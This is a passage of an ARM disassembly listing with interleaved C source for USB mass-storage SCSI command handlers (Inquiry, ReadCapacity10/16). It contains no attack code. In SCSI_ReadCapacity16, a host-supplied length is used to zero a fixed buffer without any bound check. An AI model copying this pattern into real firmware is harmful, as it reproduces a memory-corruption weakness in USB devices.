 8009b44:	68fb      	ldr	r3, [r7, #12]
 8009b46:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009b4a:	68fa      	ldr	r2, [r7, #12]
 8009b4c:	33b0      	adds	r3, #176	; 0xb0
 8009b4e:	009b      	lsls	r3, r3, #2
 8009b50:	4413      	add	r3, r2
 8009b52:	685b      	ldr	r3, [r3, #4]
 8009b54:	689b      	ldr	r3, [r3, #8]
 8009b56:	7afa      	ldrb	r2, [r7, #11]
 8009b58:	4610      	mov	r0, r2
 8009b5a:	4798      	blx	r3
 8009b5c:	4603      	mov	r3, r0
 8009b5e:	2b00      	cmp	r3, #0
 8009b60:	d00b      	beq.n	8009b7a <SCSI_TestUnitReady+0xaa>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009b62:	7af9      	ldrb	r1, [r7, #11]
 8009b64:	233a      	movs	r3, #58	; 0x3a
 8009b66:	2202      	movs	r2, #2
 8009b68:	68f8      	ldr	r0, [r7, #12]
 8009b6a:	f000 fb5b 	bl	800a224 <SCSI_SenseCode>
    hmsc->bot_state = USBD_BOT_NO_DATA;
 8009b6e:	697b      	ldr	r3, [r7, #20]
 8009b70:	2205      	movs	r2, #5
 8009b72:	721a      	strb	r2, [r3, #8]

    return -1;
 8009b74:	f04f 33ff 	mov.w	r3, #4294967295
 8009b78:	e003      	b.n	8009b82 <SCSI_TestUnitReady+0xb2>
  }
  hmsc->bot_data_length = 0U;
 8009b7a:	697b      	ldr	r3, [r7, #20]
 8009b7c:	2200      	movs	r2, #0
 8009b7e:	60da      	str	r2, [r3, #12]

  return 0;
 8009b80:	2300      	movs	r3, #0
}
 8009b82:	4618      	mov	r0, r3
 8009b84:	3718      	adds	r7, #24
 8009b86:	46bd      	mov	sp, r7
 8009b88:	bd80      	pop	{r7, pc}
	...

08009b8c <SCSI_Inquiry>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Inquiry(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009b8c:	b580      	push	{r7, lr}
 8009b8e:	b088      	sub	sp, #32
 8009b90:	af00      	add	r7, sp, #0
 8009b92:	60f8      	str	r0, [r7, #12]
 8009b94:	460b      	mov	r3, r1
 8009b96:	607a      	str	r2, [r7, #4]
 8009b98:	72fb      	strb	r3, [r7, #11]
  uint8_t *pPage;
  uint16_t len;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009b9a:	68fb      	ldr	r3, [r7, #12]
 8009b9c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009ba0:	68fb      	ldr	r3, [r7, #12]
 8009ba2:	32b0      	adds	r2, #176	; 0xb0
 8009ba4:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009ba8:	61bb      	str	r3, [r7, #24]

  if (hmsc == NULL)
 8009baa:	69bb      	ldr	r3, [r7, #24]
 8009bac:	2b00      	cmp	r3, #0
 8009bae:	d102      	bne.n	8009bb6 <SCSI_Inquiry+0x2a>
  {
    return -1;
 8009bb0:	f04f 33ff 	mov.w	r3, #4294967295
 8009bb4:	e062      	b.n	8009c7c <SCSI_Inquiry+0xf0>
  }

  if (hmsc->cbw.dDataLength == 0U)
 8009bb6:	69bb      	ldr	r3, [r7, #24]
 8009bb8:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009bbc:	699b      	ldr	r3, [r3, #24]
 8009bbe:	2b00      	cmp	r3, #0
 8009bc0:	d10b      	bne.n	8009bda <SCSI_Inquiry+0x4e>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 8009bc2:	69bb      	ldr	r3, [r7, #24]
 8009bc4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009bc8:	7f59      	ldrb	r1, [r3, #29]
 8009bca:	2320      	movs	r3, #32
 8009bcc:	2205      	movs	r2, #5
 8009bce:	68f8      	ldr	r0, [r7, #12]
 8009bd0:	f000 fb28 	bl	800a224 <SCSI_SenseCode>
    return -1;
 8009bd4:	f04f 33ff 	mov.w	r3, #4294967295
 8009bd8:	e050      	b.n	8009c7c <SCSI_Inquiry+0xf0>
  }

  if ((params[1] & 0x01U) != 0U) /* Evpd is set */
 8009bda:	687b      	ldr	r3, [r7, #4]
 8009bdc:	3301      	adds	r3, #1
 8009bde:	781b      	ldrb	r3, [r3, #0]
 8009be0:	f003 0301 	and.w	r3, r3, #1
 8009be4:	2b00      	cmp	r3, #0
 8009be6:	d021      	beq.n	8009c2c <SCSI_Inquiry+0xa0>
  {
    if (params[2] == 0U) /* Request for Supported Vital Product Data Pages*/
 8009be8:	687b      	ldr	r3, [r7, #4]
 8009bea:	3302      	adds	r3, #2
 8009bec:	781b      	ldrb	r3, [r3, #0]
 8009bee:	2b00      	cmp	r3, #0
 8009bf0:	d105      	bne.n	8009bfe <SCSI_Inquiry+0x72>
    {
      (void)SCSI_UpdateBotData(hmsc, MSC_Page00_Inquiry_Data, LENGTH_INQUIRY_PAGE00);
 8009bf2:	2206      	movs	r2, #6
 8009bf4:	4923      	ldr	r1, [pc, #140]	; (8009c84 <SCSI_Inquiry+0xf8>)
 8009bf6:	69b8      	ldr	r0, [r7, #24]
 8009bf8:	f001 f8fa 	bl	800adf0 <SCSI_UpdateBotData>
 8009bfc:	e03d      	b.n	8009c7a <SCSI_Inquiry+0xee>
    }
    else if (params[2] == 0x80U) /* Request for VPD page 0x80 Unit Serial Number */
 8009bfe:	687b      	ldr	r3, [r7, #4]
 8009c00:	3302      	adds	r3, #2
 8009c02:	781b      	ldrb	r3, [r3, #0]
 8009c04:	2b80      	cmp	r3, #128	; 0x80
 8009c06:	d105      	bne.n	8009c14 <SCSI_Inquiry+0x88>
    {
      (void)SCSI_UpdateBotData(hmsc, MSC_Page80_Inquiry_Data, LENGTH_INQUIRY_PAGE80);
 8009c08:	2208      	movs	r2, #8
 8009c0a:	491f      	ldr	r1, [pc, #124]	; (8009c88 <SCSI_Inquiry+0xfc>)
 8009c0c:	69b8      	ldr	r0, [r7, #24]
 8009c0e:	f001 f8ef 	bl	800adf0 <SCSI_UpdateBotData>
 8009c12:	e032      	b.n	8009c7a <SCSI_Inquiry+0xee>
    }
    else /* Request Not supported */
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST,
 8009c14:	69bb      	ldr	r3, [r7, #24]
 8009c16:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009c1a:	7f59      	ldrb	r1, [r3, #29]
 8009c1c:	2324      	movs	r3, #36	; 0x24
 8009c1e:	2205      	movs	r2, #5
 8009c20:	68f8      	ldr	r0, [r7, #12]
 8009c22:	f000 faff 	bl	800a224 <SCSI_SenseCode>
                     INVALID_FIELED_IN_COMMAND);

      return -1;
 8009c26:	f04f 33ff 	mov.w	r3, #4294967295
 8009c2a:	e027      	b.n	8009c7c <SCSI_Inquiry+0xf0>
    }
  }
  else
  {

    pPage = (uint8_t *) & ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId]) \
 8009c2c:	68fb      	ldr	r3, [r7, #12]
 8009c2e:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009c32:	68fa      	ldr	r2, [r7, #12]
 8009c34:	33b0      	adds	r3, #176	; 0xb0
 8009c36:	009b      	lsls	r3, r3, #2
 8009c38:	4413      	add	r3, r2
 8009c3a:	685b      	ldr	r3, [r3, #4]
            ->pInquiry[lun * STANDARD_INQUIRY_DATA_LEN];
 8009c3c:	69d9      	ldr	r1, [r3, #28]
 8009c3e:	7afa      	ldrb	r2, [r7, #11]
 8009c40:	4613      	mov	r3, r2
 8009c42:	00db      	lsls	r3, r3, #3
 8009c44:	4413      	add	r3, r2
 8009c46:	009b      	lsls	r3, r3, #2
    pPage = (uint8_t *) & ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId]) \
 8009c48:	440b      	add	r3, r1
 8009c4a:	617b      	str	r3, [r7, #20]
    len = (uint16_t)pPage[4] + 5U;
 8009c4c:	697b      	ldr	r3, [r7, #20]
 8009c4e:	3304      	adds	r3, #4
 8009c50:	781b      	ldrb	r3, [r3, #0]
 8009c52:	b29b      	uxth	r3, r3
 8009c54:	3305      	adds	r3, #5
 8009c56:	83fb      	strh	r3, [r7, #30]

    if (params[4] <= len)
 8009c58:	687b      	ldr	r3, [r7, #4]
 8009c5a:	3304      	adds	r3, #4
 8009c5c:	781b      	ldrb	r3, [r3, #0]
 8009c5e:	b29b      	uxth	r3, r3
 8009c60:	8bfa      	ldrh	r2, [r7, #30]
 8009c62:	429a      	cmp	r2, r3
 8009c64:	d303      	bcc.n	8009c6e <SCSI_Inquiry+0xe2>
    {
      len = params[4];
 8009c66:	687b      	ldr	r3, [r7, #4]
 8009c68:	3304      	adds	r3, #4
 8009c6a:	781b      	ldrb	r3, [r3, #0]
 8009c6c:	83fb      	strh	r3, [r7, #30]
    }

    (void)SCSI_UpdateBotData(hmsc, pPage, len);
 8009c6e:	8bfb      	ldrh	r3, [r7, #30]
 8009c70:	461a      	mov	r2, r3
 8009c72:	6979      	ldr	r1, [r7, #20]
 8009c74:	69b8      	ldr	r0, [r7, #24]
 8009c76:	f001 f8bb 	bl	800adf0 <SCSI_UpdateBotData>
  }

  return 0;
 8009c7a:	2300      	movs	r3, #0
}
 8009c7c:	4618      	mov	r0, r3
 8009c7e:	3720      	adds	r7, #32
 8009c80:	46bd      	mov	sp, r7
 8009c82:	bd80      	pop	{r7, pc}
 8009c84:	2000010c 	.word	0x2000010c
 8009c88:	20000114 	.word	0x20000114

08009c8c <SCSI_ReadCapacity10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ReadCapacity10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009c8c:	b590      	push	{r4, r7, lr}
 8009c8e:	b087      	sub	sp, #28
 8009c90:	af00      	add	r7, sp, #0
 8009c92:	60f8      	str	r0, [r7, #12]
 8009c94:	460b      	mov	r3, r1
 8009c96:	607a      	str	r2, [r7, #4]
 8009c98:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009c9a:	68fb      	ldr	r3, [r7, #12]
 8009c9c:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009ca0:	68fb      	ldr	r3, [r7, #12]
 8009ca2:	32b0      	adds	r2, #176	; 0xb0
 8009ca4:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009ca8:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 8009caa:	697b      	ldr	r3, [r7, #20]
 8009cac:	2b00      	cmp	r3, #0
 8009cae:	d102      	bne.n	8009cb6 <SCSI_ReadCapacity10+0x2a>
  {
    return -1;
 8009cb0:	f04f 33ff 	mov.w	r3, #4294967295
 8009cb4:	e075      	b.n	8009da2 <SCSI_ReadCapacity10+0x116>
  }

  ret = ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetCapacity(lun, &hmsc->scsi_blk_nbr,
 8009cb6:	68fb      	ldr	r3, [r7, #12]
 8009cb8:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009cbc:	68fa      	ldr	r2, [r7, #12]
 8009cbe:	33b0      	adds	r3, #176	; 0xb0
 8009cc0:	009b      	lsls	r3, r3, #2
 8009cc2:	4413      	add	r3, r2
 8009cc4:	685b      	ldr	r3, [r3, #4]
 8009cc6:	685c      	ldr	r4, [r3, #4]
 8009cc8:	697b      	ldr	r3, [r7, #20]
 8009cca:	f503 5383 	add.w	r3, r3, #4192	; 0x1060
 8009cce:	3308      	adds	r3, #8
 8009cd0:	697a      	ldr	r2, [r7, #20]
 8009cd2:	f502 5283 	add.w	r2, r2, #4192	; 0x1060
 8009cd6:	3204      	adds	r2, #4
 8009cd8:	7af8      	ldrb	r0, [r7, #11]
 8009cda:	4619      	mov	r1, r3
 8009cdc:	47a0      	blx	r4
 8009cde:	4603      	mov	r3, r0
 8009ce0:	74fb      	strb	r3, [r7, #19]
                                                                             &hmsc->scsi_blk_size);

  if ((ret != 0) || (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED))
 8009ce2:	f997 3013 	ldrsb.w	r3, [r7, #19]
 8009ce6:	2b00      	cmp	r3, #0
 8009ce8:	d106      	bne.n	8009cf8 <SCSI_ReadCapacity10+0x6c>
 8009cea:	697b      	ldr	r3, [r7, #20]
 8009cec:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009cf0:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 8009cf4:	2b02      	cmp	r3, #2
 8009cf6:	d108      	bne.n	8009d0a <SCSI_ReadCapacity10+0x7e>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009cf8:	7af9      	ldrb	r1, [r7, #11]
 8009cfa:	233a      	movs	r3, #58	; 0x3a
 8009cfc:	2202      	movs	r2, #2
 8009cfe:	68f8      	ldr	r0, [r7, #12]
 8009d00:	f000 fa90 	bl	800a224 <SCSI_SenseCode>
    return -1;
 8009d04:	f04f 33ff 	mov.w	r3, #4294967295
 8009d08:	e04b      	b.n	8009da2 <SCSI_ReadCapacity10+0x116>
  }

  hmsc->bot_data[0] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 24);
 8009d0a:	697b      	ldr	r3, [r7, #20]
 8009d0c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d10:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009d12:	3b01      	subs	r3, #1
 8009d14:	0e1b      	lsrs	r3, r3, #24
 8009d16:	b2da      	uxtb	r2, r3
 8009d18:	697b      	ldr	r3, [r7, #20]
 8009d1a:	741a      	strb	r2, [r3, #16]
  hmsc->bot_data[1] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 16);
 8009d1c:	697b      	ldr	r3, [r7, #20]
 8009d1e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d22:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009d24:	3b01      	subs	r3, #1
 8009d26:	0c1b      	lsrs	r3, r3, #16
 8009d28:	b2da      	uxtb	r2, r3
 8009d2a:	697b      	ldr	r3, [r7, #20]
 8009d2c:	745a      	strb	r2, [r3, #17]
  hmsc->bot_data[2] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >>  8);
 8009d2e:	697b      	ldr	r3, [r7, #20]
 8009d30:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d34:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009d36:	3b01      	subs	r3, #1
 8009d38:	0a1b      	lsrs	r3, r3, #8
 8009d3a:	b2da      	uxtb	r2, r3
 8009d3c:	697b      	ldr	r3, [r7, #20]
 8009d3e:	749a      	strb	r2, [r3, #18]
  hmsc->bot_data[3] = (uint8_t)(hmsc->scsi_blk_nbr - 1U);
 8009d40:	697b      	ldr	r3, [r7, #20]
 8009d42:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d46:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009d48:	b2db      	uxtb	r3, r3
 8009d4a:	3b01      	subs	r3, #1
 8009d4c:	b2da      	uxtb	r2, r3
 8009d4e:	697b      	ldr	r3, [r7, #20]
 8009d50:	74da      	strb	r2, [r3, #19]

  hmsc->bot_data[4] = (uint8_t)(hmsc->scsi_blk_size >>  24);
 8009d52:	697b      	ldr	r3, [r7, #20]
 8009d54:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d58:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009d5c:	161b      	asrs	r3, r3, #24
 8009d5e:	b2da      	uxtb	r2, r3
 8009d60:	697b      	ldr	r3, [r7, #20]
 8009d62:	751a      	strb	r2, [r3, #20]
  hmsc->bot_data[5] = (uint8_t)(hmsc->scsi_blk_size >>  16);
 8009d64:	697b      	ldr	r3, [r7, #20]
 8009d66:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d6a:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009d6e:	141b      	asrs	r3, r3, #16
 8009d70:	b2da      	uxtb	r2, r3
 8009d72:	697b      	ldr	r3, [r7, #20]
 8009d74:	755a      	strb	r2, [r3, #21]
  hmsc->bot_data[6] = (uint8_t)(hmsc->scsi_blk_size >>  8);
 8009d76:	697b      	ldr	r3, [r7, #20]
 8009d78:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d7c:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009d80:	0a1b      	lsrs	r3, r3, #8
 8009d82:	b29b      	uxth	r3, r3
 8009d84:	b2da      	uxtb	r2, r3
 8009d86:	697b      	ldr	r3, [r7, #20]
 8009d88:	759a      	strb	r2, [r3, #22]
  hmsc->bot_data[7] = (uint8_t)(hmsc->scsi_blk_size);
 8009d8a:	697b      	ldr	r3, [r7, #20]
 8009d8c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d90:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009d94:	b2da      	uxtb	r2, r3
 8009d96:	697b      	ldr	r3, [r7, #20]
 8009d98:	75da      	strb	r2, [r3, #23]

  hmsc->bot_data_length = 8U;
 8009d9a:	697b      	ldr	r3, [r7, #20]
 8009d9c:	2208      	movs	r2, #8
 8009d9e:	60da      	str	r2, [r3, #12]

  return 0;
 8009da0:	2300      	movs	r3, #0

}
 8009da2:	4618      	mov	r0, r3
 8009da4:	371c      	adds	r7, #28
 8009da6:	46bd      	mov	sp, r7
 8009da8:	bd90      	pop	{r4, r7, pc}

08009daa <SCSI_ReadCapacity16>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ReadCapacity16(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009daa:	b590      	push	{r4, r7, lr}
 8009dac:	b089      	sub	sp, #36	; 0x24
 8009dae:	af00      	add	r7, sp, #0
 8009db0:	60f8      	str	r0, [r7, #12]
 8009db2:	460b      	mov	r3, r1
 8009db4:	607a      	str	r2, [r7, #4]
 8009db6:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  uint32_t idx;
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009db8:	68fb      	ldr	r3, [r7, #12]
 8009dba:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009dbe:	68fb      	ldr	r3, [r7, #12]
 8009dc0:	32b0      	adds	r2, #176	; 0xb0
 8009dc2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009dc6:	61bb      	str	r3, [r7, #24]

  if (hmsc == NULL)
 8009dc8:	69bb      	ldr	r3, [r7, #24]
 8009dca:	2b00      	cmp	r3, #0
 8009dcc:	d102      	bne.n	8009dd4 <SCSI_ReadCapacity16+0x2a>
  {
    return -1;
 8009dce:	f04f 33ff 	mov.w	r3, #4294967295
 8009dd2:	e0ab      	b.n	8009f2c <SCSI_ReadCapacity16+0x182>
  }

  ret = ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetCapacity(lun, &hmsc->scsi_blk_nbr,
 8009dd4:	68fb      	ldr	r3, [r7, #12]
 8009dd6:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009dda:	68fa      	ldr	r2, [r7, #12]
 8009ddc:	33b0      	adds	r3, #176	; 0xb0
 8009dde:	009b      	lsls	r3, r3, #2
 8009de0:	4413      	add	r3, r2
 8009de2:	685b      	ldr	r3, [r3, #4]
 8009de4:	685c      	ldr	r4, [r3, #4]
 8009de6:	69bb      	ldr	r3, [r7, #24]
 8009de8:	f503 5383 	add.w	r3, r3, #4192	; 0x1060
 8009dec:	3308      	adds	r3, #8
 8009dee:	69ba      	ldr	r2, [r7, #24]
 8009df0:	f502 5283 	add.w	r2, r2, #4192	; 0x1060
 8009df4:	3204      	adds	r2, #4
 8009df6:	7af8      	ldrb	r0, [r7, #11]
 8009df8:	4619      	mov	r1, r3
 8009dfa:	47a0      	blx	r4
 8009dfc:	4603      	mov	r3, r0
 8009dfe:	75fb      	strb	r3, [r7, #23]
                                                                             &hmsc->scsi_blk_size);

  if ((ret != 0) || (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED))
 8009e00:	f997 3017 	ldrsb.w	r3, [r7, #23]
 8009e04:	2b00      	cmp	r3, #0
 8009e06:	d106      	bne.n	8009e16 <SCSI_ReadCapacity16+0x6c>
 8009e08:	69bb      	ldr	r3, [r7, #24]
 8009e0a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009e0e:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 8009e12:	2b02      	cmp	r3, #2
 8009e14:	d108      	bne.n	8009e28 <SCSI_ReadCapacity16+0x7e>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009e16:	7af9      	ldrb	r1, [r7, #11]
 8009e18:	233a      	movs	r3, #58	; 0x3a
 8009e1a:	2202      	movs	r2, #2
 8009e1c:	68f8      	ldr	r0, [r7, #12]
 8009e1e:	f000 fa01 	bl	800a224 <SCSI_SenseCode>
    return -1;
 8009e22:	f04f 33ff 	mov.w	r3, #4294967295
 8009e26:	e081      	b.n	8009f2c <SCSI_ReadCapacity16+0x182>
  }

  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009e28:	687b      	ldr	r3, [r7, #4]
 8009e2a:	330a      	adds	r3, #10
 8009e2c:	781b      	ldrb	r3, [r3, #0]
 8009e2e:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[11] << 16) |
 8009e30:	687b      	ldr	r3, [r7, #4]
 8009e32:	330b      	adds	r3, #11
 8009e34:	781b      	ldrb	r3, [r3, #0]
 8009e36:	041b      	lsls	r3, r3, #16
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009e38:	431a      	orrs	r2, r3
                          ((uint32_t)params[12] <<  8) |
 8009e3a:	687b      	ldr	r3, [r7, #4]
 8009e3c:	330c      	adds	r3, #12
 8009e3e:	781b      	ldrb	r3, [r3, #0]
 8009e40:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[11] << 16) |
 8009e42:	4313      	orrs	r3, r2
                          (uint32_t)params[13];
 8009e44:	687a      	ldr	r2, [r7, #4]
 8009e46:	320d      	adds	r2, #13
 8009e48:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[12] <<  8) |
 8009e4a:	431a      	orrs	r2, r3
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009e4c:	69bb      	ldr	r3, [r7, #24]
 8009e4e:	60da      	str	r2, [r3, #12]

  for (idx = 0U; idx < hmsc->bot_data_length; idx++)
 8009e50:	2300      	movs	r3, #0
 8009e52:	61fb      	str	r3, [r7, #28]
 8009e54:	e008      	b.n	8009e68 <SCSI_ReadCapacity16+0xbe>
  {
    hmsc->bot_data[idx] = 0U;
 8009e56:	69ba      	ldr	r2, [r7, #24]
 8009e58:	69fb      	ldr	r3, [r7, #28]
 8009e5a:	4413      	add	r3, r2
 8009e5c:	3310      	adds	r3, #16
 8009e5e:	2200      	movs	r2, #0
 8009e60:	701a      	strb	r2, [r3, #0]
  for (idx = 0U; idx < hmsc->bot_data_length; idx++)
 8009e62:	69fb      	ldr	r3, [r7, #28]
 8009e64:	3301      	adds	r3, #1
 8009e66:	61fb      	str	r3, [r7, #28]
 8009e68:	69bb      	ldr	r3, [r7, #24]
 8009e6a:	68db      	ldr	r3, [r3, #12]
 8009e6c:	69fa      	ldr	r2, [r7, #28]
 8009e6e:	429a      	cmp	r2, r3
 8009e70:	d3f1      	bcc.n	8009e56 <SCSI_ReadCapacity16+0xac>
  }

  hmsc->bot_data[4] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 24);
 8009e72:	69bb      	ldr	r3, [r7, #24]
 8009e74:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009e78:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009e7a:	3b01      	subs	r3, #1
 8009e7c:	0e1b      	lsrs	r3, r3, #24
 8009e7e:	b2da      	uxtb	r2, r3
 8009e80:	69bb      	ldr	r3, [r7, #24]
 8009e82:	751a      	strb	r2, [r3, #20]
  hmsc->bot_data[5] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 16);
 8009e84:	69bb      	ldr	r3, [r7, #24]
 8009e86:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009e8a:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009e8c:	3b01      	subs	r3, #1
 8009e8e:	0c1b      	lsrs	r3, r3, #16
 8009e90:	b2da      	uxtb	r2, r3
 8009e92:	69bb      	ldr	r3, [r7, #24]
 8009e94:	755a      	strb	r2, [r3, #21]
  hmsc->bot_data[6] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >>  8);
 8009e96:	69bb      	ldr	r3, [r7, #24]
 8009e98:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009e9c:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009e9e:	3b01      	subs	r3, #1
 8009ea0:	0a1b      	lsrs	r3, r3, #8
 8009ea2:	b2da      	uxtb	r2, r3
 8009ea4:	69bb      	ldr	r3, [r7, #24]
 8009ea6:	759a      	strb	r2, [r3, #22]
  hmsc->bot_data[7] = (uint8_t)(hmsc->scsi_blk_nbr - 1U);
 8009ea8:	69bb      	ldr	r3, [r7, #24]
 8009eaa:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009eae:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009eb0:	b2db      	uxtb	r3, r3
 8009eb2:	3b01      	subs	r3, #1
 8009eb4:	b2da      	uxtb	r2, r3
 8009eb6:	69bb      	ldr	r3, [r7, #24]
 8009eb8:	75da      	strb	r2, [r3, #23]

  hmsc->bot_data[8] = (uint8_t)(hmsc->scsi_blk_size >>  24);
 8009eba:	69bb      	ldr	r3, [r7, #24]
 8009ebc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009ec0:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009ec4:	161b      	asrs	r3, r3, #24
 8009ec6:	b2da      	uxtb	r2, r3
 8009ec8:	69bb      	ldr	r3, [r7, #24]
 8009eca:	761a      	strb	r2, [r3, #24]
  hmsc->bot_data[9] = (uint8_t)(hmsc->scsi_blk_size >>  16);
 8009ecc:	69bb      	ldr	r3, [r7, #24]
 8009ece:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009ed2:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009ed6:	141b      	asrs	r3, r3, #16
 8009ed8:	b2da      	uxtb	r2, r3
 8009eda:	69bb      	ldr	r3, [r7, #24]
 8009edc:	765a      	strb	r2, [r3, #25]
  hmsc->bot_data[10] = (uint8_t)(hmsc->scsi_blk_size >>  8);
 8009ede:	69bb      	ldr	r3, [r7, #24]
 8009ee0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009ee4:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009ee8:	0a1b      	lsrs	r3, r3, #8
 8009eea:	b29b      	uxth	r3, r3
 8009eec:	b2da      	uxtb	r2, r3
 8009eee:	69bb      	ldr	r3, [r7, #24]
 8009ef0:	769a      	strb	r2, [r3, #26]
  hmsc->bot_data[11] = (uint8_t)(hmsc->scsi_blk_size);
 8009ef2:	69bb      	ldr	r3, [r7, #24]
 8009ef4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009ef8:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009efc:	b2da      	uxtb	r2, r3
 8009efe:	69bb      	ldr	r3, [r7, #24]
 8009f00:	76da      	strb	r2, [r3, #27]

  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009f02:	687b      	ldr	r3, [r7, #4]
 8009f04:	330a      	adds	r3, #10
 8009f06:	781b      	ldrb	r3, [r3, #0]
 8009f08:	061a      	lsls	r2, r3, #24
                          ((uint32_t)params[11] << 16) |
 8009f0a:	687b      	ldr	r3, [r7, #4]
 8009f0c:	330b      	adds	r3, #11
 8009f0e:	781b      	ldrb	r3, [r3, #0]
 8009f10:	041b      	lsls	r3, r3, #16
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009f12:	431a      	orrs	r2, r3
                          ((uint32_t)params[12] <<  8) |
 8009f14:	687b      	ldr	r3, [r7, #4]
 8009f16:	330c      	adds	r3, #12
 8009f18:	781b      	ldrb	r3, [r3, #0]
 8009f1a:	021b      	lsls	r3, r3, #8
                          ((uint32_t)params[11] << 16) |
 8009f1c:	4313      	orrs	r3, r2
                          (uint32_t)params[13];
 8009f1e:	687a      	ldr	r2, [r7, #4]
 8009f20:	320d      	adds	r2, #13
 8009f22:	7812      	ldrb	r2, [r2, #0]
                          ((uint32_t)params[12] <<  8) |
 8009f24:	431a      	orrs	r2, r3
  hmsc->bot_data_length = ((uint32_t)params[10] << 24) |
 8009f26:	69bb      	ldr	r3, [r7, #24]
 8009f28:	60da      	str	r2, [r3, #12]

  return 0;
 8009f2a:	2300      	movs	r3, #0
}
 8009f2c:	4618      	mov	r0, r3
